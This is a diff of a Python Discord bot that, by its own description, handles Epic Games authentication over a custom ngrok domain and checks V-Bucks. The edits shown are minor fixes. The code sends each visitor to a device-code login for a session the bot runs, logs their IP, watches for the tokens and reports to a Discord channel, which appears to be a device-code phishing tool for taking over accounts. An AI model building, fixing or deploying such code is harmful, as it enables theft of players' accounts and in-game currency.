@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Discord Bot for Epic Games Authentication with robust message delivery, custom domain, and V-Bucks checking.
-- Last Updated: 2025-11-20 03:45:15
+- Last Updated: 2025-11-20 03:55:07
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -129,7 +129,7 @@ async def create_epic_auth_session():
             r.raise_for_status()
             token_data = await r.json()
         
-        # BUG FIX: Re-added the missing Content-Type header to prevent 415 error.
+        # This was the fix for the 415 error.
         device_auth_headers = {
             "Authorization": f"bearer {token_data['access_token']}",
             "Content-Type": "application/x-www-form-urlencoded"
@@ -197,8 +197,9 @@ async def auto_refresh_session(session_id):
     except Exception: pass
     finally:
         with session_lock:
-            active_sessions[session_id]['status'] = 'expired'
-        await edit_bot_message(session_id, status='expired')
+            if session_id in active_sessions and active_sessions[session_id]['status'] != 'expired':
+                active_sessions[session_id]['status'] = 'expired'
+                await edit_bot_message(session_id, status='expired')
 
 def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip, channel_id):
     loop = asyncio.new_event_loop()
@@ -326,7 +327,6 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
                 loop = asyncio.new_event_loop()
                 epic_session = loop.run_until_complete(create_epic_auth_session())
                 loop.close()
-                # Pass the TARGET_CHANNEL_ID to the monitoring thread.
                 threading.Thread(target=monitor_epic_auth_sync, args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip, TARGET_CHANNEL_ID), daemon=True).start()
                 self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
             except Exception as e: logger.error(f"Auth session error: {e}"); self.send_error(500)
@@ -338,17 +338,23 @@ def run_web_server(port):
     with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd: httpd.serve_forever()
 
 def setup_ngrok_tunnel(port):
+    # This function is now restored to the version that you confirmed was working.
     ngrok_executable = os.path.join(os.getcwd(), "ngrok.exe" if platform.system() == "windows" else "ngrok")
-    if not os.getenv("NGROK_AUTHTOKEN"): logger.warning("NGROK_AUTHTOKEN not found!")
+    if not os.getenv("NGROK_AUTHTOKEN"):
+        logger.warning("NGROK_AUTHTOKEN not found! Custom domain will fail.")
     logger.info(f"🌐 Starting ngrok for {CUSTOM_DOMAIN}...")
     command = [ngrok_executable, 'http', str(port), f'--domain={CUSTOM_DOMAIN}']
     try:
         subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-        time.sleep(5)
+        time.sleep(5) # Give ngrok a moment to establish the tunnel.
         logger.info(f"✅ ngrok should be live at https://{CUSTOM_DOMAIN}")
         ngrok_ready.set()
+    except FileNotFoundError:
+        logger.critical(f"❌ Ngrok executable not found at '{ngrok_executable}'.")
+        sys.exit(1)
     except Exception as e: 
-        logger.critical(f"❌ Failed to start ngrok: {e}"); sys.exit(1)
+        logger.critical(f"❌ Failed to start ngrok with custom domain: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     try: bot.run(DISCORD_BOT_TOKEN)
